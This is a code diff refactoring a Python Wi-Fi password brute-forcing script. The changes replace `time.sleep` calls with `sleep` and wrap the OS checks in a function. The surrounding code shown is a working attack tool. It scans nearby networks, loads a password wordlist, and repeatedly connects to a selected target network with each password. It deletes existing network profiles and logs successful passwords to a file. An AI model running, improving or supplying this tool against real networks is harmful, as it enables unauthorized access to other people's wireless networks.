@@ -1,4 +1,4 @@
-import time
+from time import sleep
 import os
 import subprocess
 import sys
@@ -6,20 +6,22 @@ import platform
 import shutil
 
 os_name = platform.system()
-if os_name == 'Windows':
-    os.system("cls")
-    try:
-        import pywifi
-        from pywifi import const
-    except ImportError as e:
-        print(f"[-] pywifi Package not found please install the package using (pip install pywifi): {e}")
-elif os_name in ['Linux', 'darwin']:
-    os.system('clear')
-    if os_name == 'Linux':
-        if shutil.which('nmcli') is None:
-            print("[-] NetworkManager (nmcli) not found. Linux wifi management requires nmcli.")
-            sys.exit()
-        print("[+] Found nmcli Package")
+def system_check():
+    if os_name == 'Windows':
+        try:
+            import pywifi
+            from pywifi import const
+        except ImportError as e:
+            print(f"[-] pywifi Package not found please install the package using (pip install pywifi): {e}")
+    elif os_name in ['Linux', 'darwin']:
+        os.system('clear')
+        if os_name == 'Linux':
+            if shutil.which('nmcli') is None:
+                print("[-] NetworkManager (nmcli) not found. Linux wifi management requires nmcli.")
+                sys.exit()
+            print("[+] Found nmcli Package")
+    
+system_check()
 
 wordlist = "not defined"
 target = "not defined".strip("'")
@@ -38,7 +40,7 @@ if os_name == 'Windows':
     Scan_Timer = 2
     def get_networks():
         iface.scan()
-        time.sleep(Scan_Timer)   # Give some time for the scan to complete
+        sleep(Scan_Timer)   # Give some time for the scan to complete
         return iface.scan_results()
 
     def wordlist_listing():
@@ -49,7 +51,7 @@ if os_name == 'Windows':
         if os.path.isfile(path):
             print("[+] Found file:", path)
             wordlist = path  # Now this will modify the global variable
-            time.sleep(0.5)
+            sleep(0.5)
             os.system("cls")  
             Windows_Boot()
             return path
@@ -96,7 +98,7 @@ if os_name == 'Windows':
                 global target 
                 target = target_selecters
                 print("[+] Founded Target")
-                time.sleep(1)
+                sleep(1)
                 os.system("cls")
                 Windows_Boot()
                 return network
@@ -123,18 +125,18 @@ if os_name == 'Windows':
 
         if target == "not defined":
             print("[-] Please select a target network first (option 2)")
-            time.sleep(2)
+            sleep(2)
             return
         
         if wordlist == "not defined":
             print("[-] Please load a wordlist first (option 1)")
-            time.sleep(2)
+            sleep(2)
             return
         
         # Check if wordlist file exists
         if not os.path.isfile(wordlist):
             print(f"[-] Wordlist file not found: {wordlist}")
-            time.sleep(2)
+            sleep(2)
             return
         
         if iface.status() == const.IFACE_DISCONNECTED:
@@ -142,7 +144,7 @@ if os_name == 'Windows':
         else:
             print("[!] Interface not ready, disconnecting...")
             iface.disconnect()
-            time.sleep(2)
+            sleep(2)
 
         attack_choice = input("THIS ATTACK WILL DELETE ARE YOUR NETWORK PROFILES DO YOU WANT TO  PROCCED? (Enter)")
         if not attack_choice:
@@ -177,7 +179,7 @@ if os_name == 'Windows':
                         
                         # Try to connect
                         iface.connect(tmp_profile)
-                        time.sleep(Connection_Timer)  # Wait for connection to establish
+                        sleep(Connection_Timer)  # Wait for connection to establish
                         
                         # Check if successfully connected
                         if iface.status() == const.IFACE_CONNECTED:
@@ -192,7 +194,7 @@ if os_name == 'Windows':
                             with open("cracked_passwords.txt", "a") as result:
                                 result.write(f"Network: {target} | Password: {password}\n")
                             
-                            time.sleep(3)
+                            sleep(3)
                             return
 
                     except Exception as e:
@@ -206,7 +208,7 @@ if os_name == 'Windows':
         except Exception as e:
             print(f"[-] Error during brute-force: {e}")
         
-        time.sleep(2)
+        sleep(2)
 
     def Windows_Boot():
         global Scan_Timer
@@ -317,7 +319,7 @@ elif os_name == 'Linux':
         if os.path.isfile(path):
             print("[+] Found file:", path)
             wordlist = path  # Now this will modify the global variable
-            time.sleep(0.5)
+            sleep(0.5)
             os.system("clear")  
             print(get_menu())
             return path
